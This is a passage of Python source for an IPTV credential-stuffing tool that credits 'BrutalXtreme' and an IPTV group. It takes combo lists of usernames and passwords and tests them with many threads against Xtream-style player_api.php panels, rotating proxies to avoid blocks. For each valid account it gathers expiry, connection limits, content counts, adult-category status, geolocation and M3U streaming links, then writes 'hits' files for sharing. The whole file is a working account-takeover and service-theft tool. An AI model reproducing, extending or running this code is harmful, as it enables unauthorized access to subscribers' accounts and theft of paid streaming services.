            print(f"\n{c('RED')}{tr('invalid_selection')}{c('RESET')}"); time.sleep(2)

    return list(combo_lines), ", ".join(combo_names)
def configure_servers():
    servers_validos = []
    while True:
        clear(); print_banner(); print(f"\n{c('CIANO')}--- [1/6] {c('BOLD')}{tr('server_title')} ---{c('RESET')}")
        print(f"[{c('VERDE_LIMAO')}1{c('RESET')}] {tr('server_option1')}"); print(f"[{c('VERDE_LIMAO')}2{c('RESET')}] {tr('server_option2')}")
        choice = input(f"{c('LARANJA')}» {c('RESET')}").strip()
        if choice == '1':
            print(tr('server_manual_instruction'))
            while len(servers_validos) < 5:
                server_url = input(f"{c('AZUL_CELESTE')}{tr('server_prompt', len(servers_validos) + 1)}{c('RESET')}").strip()
                if not server_url: break
                print(f"{c('CINZA_MEDIO')}{tr('server_checking', server_url)}{c('RESET')}", end="", flush=True)
                status = check_server_status(server_url)
                if status == "Online":
                    print(f"\r{c('VERDE_LIMAO')}{server_url:<50} {tr('server_online_added')}{c('RESET')}")
                else:
                    print(f"\r{c('RED')}{server_url:<50} {tr('server_offline')}{c('RESET')}")
                if not server_url.startswith(('http://', 'https://')): server_url = 'http://' + server_url
                servers_validos.append(server_url)
            if not servers_validos: print(f"{c('RED')}{tr('server_none_valid')}{c('RESET')}"); return None
            return [{'url': s, 'hostname': urlparse(s).hostname, 'port': str(urlparse(s).port or 80)} for s in servers_validos]
        elif choice == '2':
            server_files = [f for f in os.listdir(SERVERS_DIR) if f.endswith('.txt')]
            if not server_files: print(f"\n{c('RED')}{tr('server_no_files', SERVERS_DIR)}{c('RESET')}"); input(f"{c('AMARELO_OURO')}{tr('server_no_files_prompt')}{c('RESET')}"); continue
            print(f"\n{c('AZUL_CELESTE')}{tr('server_files_available')}{c('RESET')}")
            for i, arquivo in enumerate(server_files, 1): print(f"[{c('VERDE_LIMAO')}{i}{c('RESET')}] {arquivo}")
            file_choice = input(f"{c('LARANJA')}» {c('RESET')}").strip()
            if file_choice.isdigit() and 0 < int(file_choice) <= len(server_files):
                filepath = os.path.join(SERVERS_DIR, server_files[int(file_choice) - 1])
                with open(filepath, 'r', encoding='utf-8', errors='ignore') as f: servers_from_file = [line.strip() for line in f if line.strip()]
                clear(); print_banner(); print(f"\n{c('AZUL_CELESTE')}{tr('server_select_max')}{c('RESET')}")
                for i, server_url in enumerate(servers_from_file, 1): print(f"[{c('VERDE_LIMAO')}{i}{c('RESET')}] {server_url}")
                selected_indices_str = input(f"{c('LARANJA')}{tr('server_select_indices')}{c('RESET')}").strip()
                try:
                    indices = [int(n.strip()) - 1 for n in selected_indices_str.split(',') if n.strip()]
                    if len(indices) > 5: print(f"{c('AMARELO_OURO')}{tr('server_max_warning')}{c('RESET')}"); indices = indices[:5]
                    selected_servers = [servers_from_file[i] for i in indices if 0 <= i < len(servers_from_file)]
                    print(f"\n{c('CIANO')}{tr('server_verifying')}{c('RESET')}")
                    for server_url in selected_servers:
                        status = check_server_status(server_url)
                        if status == "Online":
                            print(f"{c('VERDE_LIMAO')}{tr('server_online', server_url)}{c('RESET')}")
                        else:
                            print(f"{c('RED')}{tr('server_offline_server', server_url)}{c('RESET')}")
                        if not server_url.startswith(('http://', 'https://')): server_url = 'http://' + server_url
                        servers_validos.append(server_url)
                    
                    if not servers_validos: print(f"\n{c('RED')}{tr('server_none_valid')}{c('RESET')}"); return None
                    print(f"\n{c('VERDE_ESMERALDA')}{len(servers_validos)} servidores adicionados para o scan.{c('RESET')}"); time.sleep(2)
                    return [{'url': s, 'hostname': urlparse(s).hostname, 'port': str(urlparse(s).port or 80)} for s in servers_validos]
                except (ValueError, IndexError): print(f"{c('RED')}{tr('invalid_selection')}{c('RESET')}")
            else: print(f"{c('RED')}{tr('invalid_selection')}{c('RESET')}"); time.sleep(2); continue
        else: print(f"{c('RED')}{tr('invalid_option')}{c('RESET')}"); time.sleep(2)
def get_country_flag(country_code):
    if not isinstance(country_code, str) or len(country_code) != 2:
        return '🌎' 
    return "".join(chr(ord(c) + 127397) for c in country_code.upper())
def get_geo_info(hostname):
    with dns_cache_lock:
        if hostname in dns_cache:
            ip = dns_cache[hostname]
        else:
            try:
                ip = socket.gethostbyname(hostname)
                dns_cache[hostname] = ip
            except socket.gaierror:
                return {}
    try:
        response = requests.get(f"http://ip-api.com/json/{ip}?fields=status,city,countryCode,isp", timeout=5)
        if response.status_code == 200:
            data = response.json()
            if data.get('status') == 'success':
                country_code = data.get('countryCode', '')
                flag = get_country_flag(country_code)
                return {
                    'ip': ip,
                    'city': data.get('city', 'N/A'),
                    'isp': data.get('isp', 'N/A'),
                    'flag': flag
                }
            else:
                return {'ip': ip, 'flag': '🌎'}
    except requests.RequestException:
        pass
    return {'ip': ip, 'flag': '🌎'}
def check_server_status(server_url):
    try:
        if not server_url.startswith(('http://', 'https://')): server_url = 'http://' + server_url
        parsed_url = urlparse(server_url); host_port = parsed_url.netloc; api_url = f"http://{host_port}/player_api.php"
        response = requests.get(api_url, timeout=5, verify=False, allow_redirects=True)
        if response.status_code < 500: return "Online"
    except (requests.exceptions.RequestException, requests.exceptions.Timeout): return "Offline"
    return "Offline"
def get_content_counts(session, panel_url, user, password, headers, use_proxy):
    counts = {'live': '0', 'vod': '0', 'series': '0'}; actions = {'live': 'get_live_streams', 'vod': 'get_vod_streams', 'series': 'get_series'}
    for content_type, action in actions.items():
        try:
            url = f"http://{panel_url}/player_api.php?username={user}&password={password}&action={action}"
            proxies = proxy_handler.get_random_proxy() if use_proxy else None
            res = session.get(url, headers=headers, timeout=15, verify=False, proxies=proxies)
            if res.status_code == 200 and res.text.strip():
                try:
                    data = res.json()
                    if isinstance(data, list): counts[content_type] = str(len(data))
                except json.JSONDecodeError: pass
        except requests.RequestException: pass
    return counts['live'], counts['vod'], counts['series']
def verify_adult_content(session, panel_url, user, password, headers, use_proxy):
    url = f"http://{panel_url}/player_api.php?username={user}&password={password}&action=get_live_categories"
    termos_adultos = ["adult", "18+", "+18", "xxx", "porn", "sex", "erotic", "adulto"]
    try:
        proxies = proxy_handler.get_random_proxy() if use_proxy else None
        res = session.get(url, headers=headers, timeout=15, verify=False, proxies=proxies)
        if res.status_code == 200:
            categorias = res.json()
            for categoria in categorias:
                nome_categoria = categoria.get('category_name', '').lower()
                if any(termo in nome_categoria for termo in termos_adultos): return tr('adult_yes')
            return tr('adult_no')
    except Exception: return tr('adult_na')
    return tr('adult_na')
def save_ordered_hits():
    if not ORDERED_HITS_BY_SERVER: return
    try:
        os.makedirs(ORDERED_HITS_DIR, exist_ok=True); data_hora_str = datetime.datetime.now().strftime("%d_%m_%Y_%H")
        for server_key, hits_list in ORDERED_HITS_BY_SERVER.items():
            hits_list_sorted = sorted(hits_list, key=lambda x: x[0], reverse=True)
            safe_server_key = re.sub(r'[^a-zA-Z0-9]', '_', server_key)
            filename = f"Ordenados_{safe_server_key}_{data_hora_str}.txt"; filepath = os.path.join(ORDERED_HITS_DIR, filename)
            with open(filepath, 'w', encoding='utf-8') as f:
                for _, content in hits_list_sorted: f.write(content + "\n")
            print(f"{c('VERDE_ESMERALDA')}{tr('ordered_hits_saved_success')}{c('RESET')}"); print(f"{c('AZUL_CELESTE')}{filepath}{c('RESET')}")
    except Exception as e: print(f"{c('RED')}{tr('ordered_hits_saved_fail')}: {e}{c('RESET')}")
def save_valid_hits_combo():
    if VALID_HITS:
        try:
            os.makedirs(os.path.dirname(COMBO_HITS_FILE), exist_ok=True)
            existing_hits = set()
            if os.path.exists(COMBO_HITS_FILE):
                with open(COMBO_HITS_FILE, 'r', encoding='utf-8') as f: existing_hits = set(line.strip() for line in f)
            unique_hits_to_save = VALID_HITS.difference(existing_hits)
            if unique_hits_to_save:
                with open(COMBO_HITS_FILE, 'a', encoding='utf-8') as f:
                    for hit in sorted(list(unique_hits_to_save)): f.write(hit + "\n")
            print(f"\n{c('VERDE_ESMERALDA')}{tr('combo_hits_saved', COMBO_HITS_FILE)}{c('RESET')}")
        except Exception as e: print(f"{c('RED')}Erro ao salvar Combo_Hits.txt: {e}{c('RESET')}")
def get_developer_credits():
    now = datetime.datetime.now()
    return (
        "========================================\n"
        "Script Original.    : BrutalXtreme\n"
        "Desenvolvido por : Grupo So os Top Iptv\n"
        f"Horas             : {now.strftime('%H:%M')}\n"
        f"Data do Scan     : {now.strftime('%d/%m/%Y')}\n"
        "========================================\n\n"
    )
def process_and_save_hit(hit_data, user, password, server_config, config):
    global hit_count
    with stats_lock:
        hit_count += 1; server_key = f"{server_config['hostname']}:{server_config['port']}"
        server_hit_counts[server_key] = server_hit_counts.get(server_key, 0) + 1
        VALID_HITS.add(f"{user}:{password}")
    info = hit_data.get('user_info', {}); exp_date_ts, created_at_ts = info.get('exp_date'), info.get('created_at')
    exp_date_str, days_left_str, days_left, exp_date_complete_str = tr('unlimited'), "∞", -1, tr('na')
    if exp_date_ts and str(exp_date_ts).isdigit() and int(exp_date_ts) > 0:
        exp_datetime = datetime.datetime.fromtimestamp(int(exp_date_ts)); exp_date_str = exp_datetime.strftime('%d/%m/%Y')
        exp_date_complete_str = exp_datetime.strftime('%H:%M:%S - %d/%m/%Y')
        days_left = (exp_datetime - datetime.datetime.now()).days; days_left_str = str(max(0, days_left))
    created_at_str, created_at_complete_str = tr('na'), tr('na')
    if created_at_ts and str(created_at_ts).isdigit():
        created_datetime = datetime.datetime.fromtimestamp(int(created_at_ts))
        created_at_str = created_datetime.strftime('%d/%m/%Y'); created_at_complete_str = created_datetime.strftime('%H:%M:%S - %d/%m/%Y')
    status, active_cons, max_cons = info.get('status', 'N/A'), info.get('active_cons', 'N/A'), info.get('max_connections', 'N/A')
    portal_url = f"{server_config['hostname']}:{server_config['port']}"; server_url = f"http://{portal_url}"
    m3u_link = f"{server_url}/get.php?username={user}&password={password}&type=m3u_plus&output=ts"
    epg_link = f"{server_url}/xmltv.php?username={user}&password={password}"
    session = get_session(); headers = {'User-Agent': 'okhttp/4.7.1'}; use_proxy = config.get('use_proxy', False)
    kanalsayisi, filmsayisi, dizisayisi = get_content_counts(session, portal_url, user, password, headers, use_proxy)
    geo_info = get_geo_info(server_config['hostname'])
    adult_info = verify_adult_content(session, portal_url, user, password, headers, use_proxy)
    
    server_details = config['scan_details'].get(server_config['url'], {})
    combo_name = server_details.get('combo_name', tr('na'))

    placeholders = {
        "host": server_url, "porta": server_config['port'], "usuario": user, "senha": password, "ip_host": geo_info.get('ip', tr('na')),
        "regiao": f"{geo_info.get('city', tr('na'))} {geo_info.get('flag', '')}".strip(),
        "isp": geo_info.get('isp', tr('na')),
        "status": str(status).replace('Active', tr('active')).replace('active', tr('active')), "criada_data": created_at_str, "criada_completa": created_at_complete_str,
        "expira_data": exp_date_str, "expira_completa": exp_date_complete_str, "dias_restantes": days_left_str, "conexoes_ativas": str(active_cons), "conexoes_max": str(max_cons),
        "canais": kanalsayisi, "filmes": filmsayisi, "series": dizisayisi, "total_vod": str(int(filmsayisi) + int(dizisayisi)),
        "conteudo_adulto": adult_info, "link_m3u": m3u_link, "link_epg": epg_link, "nickname": config['nickname'],
        "combo_nome": combo_name, "data": time.strftime('%d/%m/%Y'), "hora": time.strftime('%H:%M:%S'),
    }
    
    layout_name_to_use = config.get('layouts_per_server', {}).get(server_key) or config.get('hit_layout_name')
    layout_to_use = None
    if layout_name_to_use:
        all_layouts = load_layouts()
        for layout in all_layouts:
            if layout['nome_display'] == layout_name_to_use:
                layout_to_use = layout
                break
    
    if not layout_to_use: return
    
    hit_content = "\n".join(layout_to_use['template']).format_map(defaultdict(lambda: tr('na'), **placeholders))
    if config.get('save_ordered_hits', '2') == '1': ORDERED_HITS_BY_SERVER[server_key].append((days_left, hit_content))
    safe_hostname = re.sub(r'[^a-zA-Z0-9.-]', '_', portal_url)
    filename = f"{layout_to_use['nome_display'].replace(' ','')}_{safe_hostname}.txt"
    filepath = os.path.join(HITS_DIR, filename)
    with hit_file_lock:
        file_exists = os.path.exists(filepath)
        with open(filepath, 'a', encoding='utf-8') as f:
            if not file_exists:
                f.write(get_developer_credits())
            f.write(hit_content + "\n\n")
def worker(server_config, config, server_queue):
    global checked_count, bad_count, error_count, last_check_report
    session = get_session(); server_key = f"{server_config['hostname']}:{server_config['port']}"; api_url_base = f"http://{server_key}/player_api.php"
    while scan_active and not server_queue.empty():
        try:
            line = server_queue.get_nowait()
            if ':' not in line:
                with stats_lock: 
                    checked_count += 1
                    server_progress_counts[server_key] = server_progress_counts.get(server_key, 0) + 1
                server_queue.task_done(); continue
            user, password = [x.strip() for x in line.split(':', 1)]
            if not user or not password:
                with stats_lock: 
                    checked_count += 1
                    server_progress_counts[server_key] = server_progress_counts.get(server_key, 0) + 1
                server_queue.task_done(); continue
            with stats_lock: last_check_report = f"{user}:{password}"
            api_url = f"{api_url_base}?username={user}&password={password}"
            try:
                proxies = proxy_handler.get_random_proxy() if config.get('use_proxy') else None
                headers = {'User-Agent': 'okhttp/4.7.1'}; response = session.get(api_url, headers=headers, timeout=10, verify=False, proxies=proxies)
                with stats_lock: server_statuses[server_key] = response.status_code
                if response.status_code == 200:
                    data = response.json()
                    if isinstance(data, dict) and data.get("user_info", {}).get("auth") == 1 and data["user_info"].get("status", "").lower() == 'active':
                        process_and_save_hit(data, user, password, server_config, config)
                    else:
                        with stats_lock: bad_count += 1
                else:
                    with stats_lock: bad_count += 1
            except (requests.RequestException, json.JSONDecodeError):
                with stats_lock: server_statuses[server_key] = "ERRO"; error_count += 1
            with stats_lock: 
                checked_count += 1
                server_progress_counts[server_key] = server_progress_counts.get(server_key, 0) + 1
            server_queue.task_done()
        except queue.Empty: break
        except Exception:
            with stats_lock: error_count += 1; continue
def build_display_panel(config):
    global cpm
    with stats_lock:
        elapsed_time = time.time() - scan_start_time if scan_start_time else 0
        if elapsed_time > 1: cpm = int((checked_count / elapsed_time) * 60)
        
        total_lines_to_check = config['total_lines']
        remaining_lines = total_lines_to_check - checked_count
        eta_seconds = (remaining_lines / (cpm + 1e-6)) * 60
        progress_percent = (checked_count / total_lines_to_check) * 100 if total_lines_to_check > 0 else 0
        
        bar_width = 20; filled = int(bar_width * progress_percent / 100)
        progress_bar = f"{c('VERDE_ESMERALDA')}{'█' * filled}{c('CINZA_MEDIO')}{'─' * (bar_width - filled)}{c('RESET')}"
        
        proxy_status_str = f"{c('VERDE_LIMAO')}{tr('active')} ({config.get('proxy_type', 'N/A').upper()}){c('RESET')}" if config.get('use_proxy') else f"{c('RED')}{tr('inactive')}{c('RESET')}"
        
        all_combo_names = list(set(details['combo_name'] for details in config['scan_details'].values()))
        combo_display = ", ".join(all_combo_names)

    total_bots = config['bots_per_server'] * len(config['scan_details'])
    
    clear()
    
    title = f" {tr('scan_progress_title')} "
    print(f"\n{c('MAGENTA')}{'=' * ((39 - len(title)) // 2)}{title}{'=' * ((39 - len(title)) // 2)}{c('RESET')}" + " ")

    print(f" {c('VIOLETA')}{'Nickname....'}: {c('BOLD')}{config['nickname']}{c('RESET')}" + " ")
    print(f" {c('VIOLETA')}{tr('combos_plural_label')}...: {c('BOLD')}{combo_display}{c('RESET')}" + " ")
    print(f" {c('VIOLETA')}{'Bots........'}: {c('BOLD')}{total_bots}{c('RESET')}" + " ")
    print(f" {c('VIOLETA')}{'Proxy.......'}: {proxy_status_str}" + " ")
    if config.get('use_proxy'): print(f" {c('VIOLETA')}{'IP do Proxy..'}: {last_used_proxy}" + " ")

    print(f"\n{c('MAGENTA')}{tr('servers_status_title')}{c('RESET')}" + " ")
    for server_url, details in config['scan_details'].items():
        server_key = f"{urlparse(server_url).hostname}:{urlparse(server_url).port or 80}"
        s_status = server_statuses.get(server_key, tr('waiting'))
        s_progress = server_progress_counts.get(server_key, 0)
        s_total = len(details['combo_lines'])
        s_hits = server_hit_counts.get(server_key, 0)
        s_combo_name = details.get('combo_name', tr('na'))

        status_color = c('VERDE_LIMAO')
        status_text = str(s_status)
        if s_status == "ERRO": 
            status_color = c('AMARELO_OURO')
            status_text = tr('status_error')
        elif isinstance(s_status, int):
            if s_status == 200:
                 status_text = f"[{s_status}] {tr('status_ok')}"
            elif 400 <= s_status < 500: 
                status_color = c('RED')
                status_text = f"[{s_status}] {tr('status_client_error')}"
            elif s_status >= 500: 
                status_color = c('VIOLETA')
                status_text = f"[{s_status}] {tr('status_server_error')}"
        
        print(f" {c('BOLD')}{server_url}{c('RESET')}" + " ")
        print(f"   {c('CINZA_MEDIO')}├─ {tr('connection_status')}: {status_color}{status_text}{c('RESET')}" + " ")
        print(f"   {c('CINZA_MEDIO')}├─ {tr('combo_in_use')}: {s_combo_name}" + " ")
        print(f"   {c('CINZA_MEDIO')}├─ {tr('progress')}........: {s_progress} / {s_total}" + " ")
        print(f"   {c('CINZA_MEDIO')}└─ {tr('hits')}.............: {c('VERDE_LIMAO')}{s_hits}{c('RESET')}" + " ")

    print(f"{c('MAGENTA')}======================================={c('RESET')}" + " ")

    print(f"\n {progress_bar} {c('AMARELO_OURO')}{progress_percent:.1f}%{c('RESET')}" + " ")
    print(f" {c('CIANO')}{tr('tested')}: {checked_count}/{total_lines_to_check} | {c('CIANO')}{tr('speed')}: {cpm} CPM" + " ")
    print(f" {c('VERDE_LIMAO')}{tr('hits')}: {hit_count}{c('RESET')} | {c('RED')}{tr('bads')}: {bad_count}{c('RESET')} | {c('AMARELO_OURO')}{tr('errors')}: {error_count}{c('RESET')}" + " ")
    print(f" {c('CINZA_MEDIO')}{tr('time')}: {format_duration(elapsed_time)} | {c('CINZA_MEDIO')}{tr('eta_geral')}: {format_duration(eta_seconds)}" + " ")
    user, _, password = last_check_report.partition(':')
    print(f" {c('CINZA_MEDIO')}{tr('last_test')}: {unquote(f'{user}:{password}')}{c('RESET')}" + " ")
    
def display_manager(config):
    global scan_active
    total_checks = config['total_lines']
    def check_input():
        global scan_active
        while scan_active:
            try:
                rlist, _, _ = select.select([sys.stdin], [], [], 1.5)
                if rlist:
                    char = sys.stdin.read(1).lower()
                    if char == 'q': print("\n\n" + tr('scan_interrupted')); scan_active = False; break
            except Exception: pass
    input_thread = threading.Thread(target=check_input, daemon=True); input_thread.start()
    while scan_active:
        if checked_count >= total_checks: scan_active = False; break
        with display_lock: build_display_panel(config)
        time.sleep(1.5)
    if not scan_active and checked_count < total_checks:
        if config.get('save_ordered_hits', '2') == '1': save_ordered_hits()
        save_valid_hits_combo()
def main_scan(config):
    global scan_start_time, scan_active, checked_count, hit_count, bad_count, error_count, VALID_HITS
    global server_hit_counts, server_statuses, last_check_report, last_used_proxy, dns_cache, ORDERED_HITS_BY_SERVER, server_progress_counts
    
    checked_count, hit_count, bad_count, error_count = 0, 0, 0, 0
    last_check_report, last_used_proxy, dns_cache = "", "", {}
    ORDERED_HITS_BY_SERVER.clear()
    
    server_keys = [f"{s['hostname']}:{s['port']}" for s in config['servers']]
    server_hit_counts = {key: 0 for key in server_keys}
    server_statuses = {key: tr('waiting') for key in server_keys}
    server_progress_counts = {key: 0 for key in server_keys}

    scan_start_time, scan_active = time.time(), True
    threads = []

    for server_info in config['servers']:
        server_url = server_info['url']
        details = config['scan_details'].get(server_url)
        if not details: continue

        q = queue.Queue()
        for line in details['combo_lines']:
            q.put(line)

        for _ in range(config['bots_per_server']):
            t = threading.Thread(target=worker, args=(server_info, config, q), daemon=True)
            threads.append(t)
            t.start()
            
    try:
        display_manager(config)
    except KeyboardInterrupt:
        print("\n\n" + tr('scan_interrupted'))
        scan_active = False
        
    scan_active = False
    print("\n" + tr('scan_finishing'))
    for t in threads:
        t.join(timeout=2)
        
    clear(); print_banner();
    final_duration = time.time() - scan_start_time
    all_combo_names = list(set(details['combo_name'] for details in config['scan_details'].values()))
    combo_display = ", ".join(all_combo_names)

    print(f"\n{c('AMARELO_OURO')}{tr('scan_summary')}{c('RESET')}")
    print(f"{c('CIANO')}{tr('scan_duration', format_duration(final_duration))}")
    print(f"{c('CIANO')}{tr('scan_combo', combo_display)}")
    print(f"{c('CIANO')}{tr('scan_tested', checked_count)}")
    print(f" {c('VERDE_LIMAO')}{tr('scan_hits', hit_count)}")
    print(f" {c('RED')}{tr('scan_bads', bad_count)}")
    print(f" {c('AMARELO_OURO')}{tr('scan_errors', error_count)}")
    
    print(f"\n{c('AMARELO_OURO')}{tr('scan_hits_per_server')}{c('RESET')}")
    for server_key, hits in server_hit_counts.items():
        print(f" {c('BRANCO')}{tr('scan_hits_server', server_key, hits)}")
        
    print(f"\n{c('VERDE_ESMERALDA')}{tr('scan_hits_saved', HITS_DIR)}{c('RESET')}")
    if config.get('save_ordered_hits', '2') == '1': save_ordered_hits()
    save_valid_hits_combo()

def run_configuration_wizard():
    config = {'layouts_per_server': {}, 'scan_details': {}}
    
    clear(); print_banner()
    config['nickname'] = input(f"{c('VIOLETA')}{tr('nickname_question', CONFIG.get('nickname', 'Brutal'))}{c('RESET')}").strip() or CONFIG.get('nickname', 'Brutal')
    CONFIG['nickname'] = config['nickname']; save_config(CONFIG)
    
    servers = configure_servers()
    if not servers: return None
    config['servers'] = servers

    last_combo_choice = None
    lang_confirm_map = {"pt": "s", "en": "y", "es": "s"}
    lang_confirm = lang_confirm_map.get(CONFIG.get("language", "pt"), "s")

    for i, server_info in enumerate(servers):
        server_url = server_info['url']
        combo_lines, combo_name = None, None

        if i > 0 and last_combo_choice:
            question = tr('use_same_combo_q', last_combo_choice['combo_name'], server_url)
            use_same = input(f"\n{c('AMARELO_OURO')}{question}{c('RESET')} ").strip().lower()
            if use_same == lang_confirm:
                combo_lines = last_combo_choice['combo_lines']
                combo_name = last_combo_choice['combo_name']

        if not combo_lines:
            combo_lines, combo_name = configure_combo_for_server(server_url)
            if not combo_lines:
                print(f"\n{c('RED')}{tr('aborted')}{c('RESET')}")
                return None
            last_combo_choice = {'combo_lines': combo_lines, 'combo_name': combo_name}
        
        config['scan_details'][server_url] = {
            'combo_lines': combo_lines,
            'combo_name': combo_name
        }
        
    config['total_lines'] = sum(len(details['combo_lines']) for details in config['scan_details'].values())
    if config['total_lines'] == 0:
        print(f"\n{c('RED')}{tr('combo_empty')}{c('RESET')}")
        return None

    clear(); print_banner(); use_proxy, proxy_type = configure_proxy(3, 6)
    config.update({'use_proxy': use_proxy, 'proxy_type': proxy_type})

    clear(); print_banner(); layouts = load_layouts(); default_layout_name = CONFIG.get('default_layout');
    default_layout = next((l for l in layouts if l['nome_display'] == default_layout_name), None)
    
    print(f"\n{c('CIANO')}--- [4/6] {c('BOLD')}{tr('layout_select_title')} ---{c('RESET')}")
    if len(servers) > 1:
        print(f"\n{c('AMARELO_OURO')}{tr('layout_per_server_q', len(servers))}{c('RESET')}")
        per_server_choice = input(f"\n{c('LARANJA')}» {c('RESET')}").strip().lower()
        if per_server_choice == lang_confirm:
            for server in servers:
                server_key = f"{server['hostname']}:{server['port']}"
                clear(); print_banner(); print(f"\n{c('CIANO')}--- {tr('configuring_layout_for', server_key)} ---{c('RESET')}")
                for i, layout in enumerate(layouts, 1): print(f"[{c('VERDE_LIMAO')}{i}{c('RESET')}] {layout['nome_display']}")
                try:
                    choice = int(input(f"\n{c('LARANJA')}{tr('choose_layout_for_this_server')}{c('RESET')} ").strip()) - 1
                    config['layouts_per_server'][server_key] = layouts[choice]['nome_display']
                except (ValueError, IndexError): config['layouts_per_server'][server_key] = layouts[0]['nome_display']
            clear(); print_banner(); print(f"\n{c('AZUL_ROYAL')}--- {tr('layouts_summary_title')} ---{c('RESET')}")
            for server in servers:
                server_key = f"{server['hostname']}:{server['port']}"
                layout_name = config['layouts_per_server'][server_key]
                print(tr('layouts_summary_line', c('BOLD')+server_key+c('RESET'), c('VERDE_LIMAO')+layout_name+c('RESET')))
            input(f"\n{c('CINZA_MEDIO')}{tr('press_enter_continue')}{c('RESET')}")
        else:
            if default_layout:
                print(f"\n{c('AZUL_CELESTE')}{tr('using_default_layout_info', default_layout_name)}{c('RESET')}")
                print(f"\n{c('AMARELO_OURO')}{tr('prompt_use_default_or_choose')}{c('RESET')}")
                print(f"[{c('VERDE_LIMAO')}1{c('RESET')}] {tr('option_use_default')}"); print(f"[{c('VERDE_LIMAO')}2{c('RESET')}] {tr('option_choose_another')}")
                main_layout_choice = input(f"\n{c('LARANJA')}» {c('RESET')}").strip()
                if main_layout_choice != '2': config['hit_layout_name'] = default_layout['nome_display']
                else:
                    clear(); print_banner(); print(f"\n{c('CIANO')}--- {c('BOLD')}{tr('layout_select_title')} ---{c('RESET')}")
                    for i, layout in enumerate(layouts, 1): print(f"[{c('VERDE_LIMAO')}{i}{c('RESET')}] {layout['nome_display']}")
                    try:
                        choice = int(input(f"\n{c('LARANJA')}» {c('RESET')}").strip()) - 1
                        config['hit_layout_name'] = layouts[choice]['nome_display']
                    except (ValueError, IndexError): config['hit_layout_name'] = default_layout['nome_display']
            else:
                clear(); print_banner(); print(f"\n{c('CIANO')}--- {c('BOLD')}{tr('layout_select_title')} ---{c('RESET')}")
                for i, layout in enumerate(layouts, 1): print(f"[{c('VERDE_LIMAO')}{i}{c('RESET')}] {layout['nome_display']}")
                try:
                    choice = int(input(f"\n{c('LARANJA')}» {c('RESET')}").strip()) - 1
                    config['hit_layout_name'] = layouts[choice]['nome_display']
                except (ValueError, IndexError): config['hit_layout_name'] = layouts[0]['nome_display']
    else:
        if default_layout:
            print(f"\n{c('AZUL_CELESTE')}{tr('using_default_layout_info', default_layout_name)}{c('RESET')}")
            print(f"\n{c('AMARELO_OURO')}{tr('prompt_use_default_or_choose')}{c('RESET')}")
            print(f"[{c('VERDE_LIMAO')}1{c('RESET')}] {tr('option_use_default')}"); print(f"[{c('VERDE_LIMAO')}2{c('RESET')}] {tr('option_choose_another')}")
            choice = input(f"\n{c('LARANJA')}» {c('RESET')}").strip()
            if choice == '2':
                clear(); print_banner(); print(f"\n{c('CIANO')}--- {tr('please_choose_layout_for', servers[0]['hostname'])} ---{c('RESET')}")
                for i, layout in enumerate(layouts, 1): print(f"[{c('VERDE_LIMAO')}{i}{c('RESET')}] {layout['nome_display']}")
                try:
                    choice_idx = int(input(f"\n{c('LARANJA')}» {c('RESET')}").strip()) - 1
                    config['hit_layout_name'] = layouts[choice_idx]['nome_display']
                except (ValueError, IndexError): config['hit_layout_name'] = default_layout['nome_display']
            else: config['hit_layout_name'] = default_layout['nome_display']
        else:
            clear(); print_banner(); print(f"\n{c('CIANO')}--- {tr('please_choose_layout_for', servers[0]['hostname'])} ---{c('RESET')}")
            for i, layout in enumerate(layouts, 1): print(f"[{c('VERDE_LIMAO')}{i}{c('RESET')}] {layout['nome_display']}")
            try:
                choice_idx = int(input(f"\n{c('LARANJA')}» {c('RESET')}").strip()) - 1
                config['hit_layout_name'] = layouts[choice_idx]['nome_display']
            except (ValueError, IndexError): config['hit_layout_name'] = layouts[0]['nome_display']

    if 'hit_layout_name' not in config and not config.get('layouts_per_server'): 
        config['hit_layout_name'] = default_layout['nome_display'] if default_layout else layouts[0]['nome_display']

    clear(); print_banner(); print(f"\n{c('CIANO')}--- [5/6] {c('BOLD')}{tr('ordered_hits_title')} ---{c('RESET')}"); print(f"{c('AMARELO_OURO')}{tr('ordered_hits_question')}{c('RESET')}")
    print(f"{c('CINZA_MEDIO')}{tr('ordered_hits_warning')}{c('RESET')}"); print(f"\n[{c('VERDE_LIMAO')}1{c('RESET')}] {tr('ordered_hits_option1')}\n[{c('VERDE_LIMAO')}2{c('RESET')}] {tr('ordered_hits_option2')}")
    config['save_ordered_hits'] = input(f"{c('LARANJA')}» {c('RESET')}").strip() or "2"
    
    clear(); print_banner(); print(f"\n{c('CIANO')}--- [6/6] {c('BOLD')}{tr('bots_title')} ---{c('RESET')}")
    while True:
        try:
            bots = input(f"{c('AMARELO_OURO')}{tr('bots_question')}{c('RESET')}").strip() or "15"
            config['bots_per_server'] = int(bots)
            if config['bots_per_server'] > 0: break
            else: print(f"{c('RED')}{tr('bots_invalid')}")
        except ValueError: print(f"{c('RED')}{tr('bots_invalid')}")
    
    return config
def main_menu():
    while True:
        clear(); print_banner()
        print(f"\n{c('AZUL_ROYAL')}--- {c('BOLD')}{tr('menu_main')} ---{c('RESET')}"); print(f"[{c('VERDE_LIMAO')}1{c('RESET')}] {c('BRANCO')}{tr('start_scan')}{c('RESET')}"); print(f"[{c('VERDE_LIMAO')}2{c('RESET')}] {c('BRANCO')}{tr('settings')}{c('RESET')}"); print(f"[{c('VERDE_LIMAO')}3{c('RESET')}] {c('BRANCO')}{tr('exit')}{c('RESET')}")
        choice = input(f"\n{c('LARANJA')}» {c('RESET')}").strip()
        if choice == "1":
            scan_config = run_configuration_wizard()
            if scan_config:
                main_scan(scan_config)
                lang_confirm_map = {"pt": "s", "en": "y", "es": "s"}
                lang_confirm = lang_confirm_map.get(CONFIG.get("language", "pt"), "s")
                if input(f"\n{c('AMARELO_OURO')}{tr('restart_question')}{c('RESET')}").strip().lower() != lang_confirm: break
            else: print(f"\n{c('RED')}{tr('aborted')}{c('RESET')}"); time.sleep(2)
        elif choice == "2": settings_menu()
        elif choice == "3": break
    print(f"\n{c('AMARELO_OURO')}{tr('goodbye')}{c('RESET')}"); sys.exit(0)
if __name__ == "__main__":
    create_directories(); create_default_layouts_if_not_exists()
    loaded_config = load_config()
    if loaded_config is None: CONFIG = DEFAULT_CONFIG; init_theme(); first_time_setup(); CONFIG = load_config()
    else: CONFIG = {**DEFAULT_CONFIG, **loaded_config}
    init_theme()
    if loaded_config is not None: clear(); print_banner(); print(f"\n{c('VERDE_ESMERALDA')}{c('BOLD')}{tr('welcome')}{c('RESET')}"); time.sleep(2)
    main_menu() #{'__name__': '__main__'}
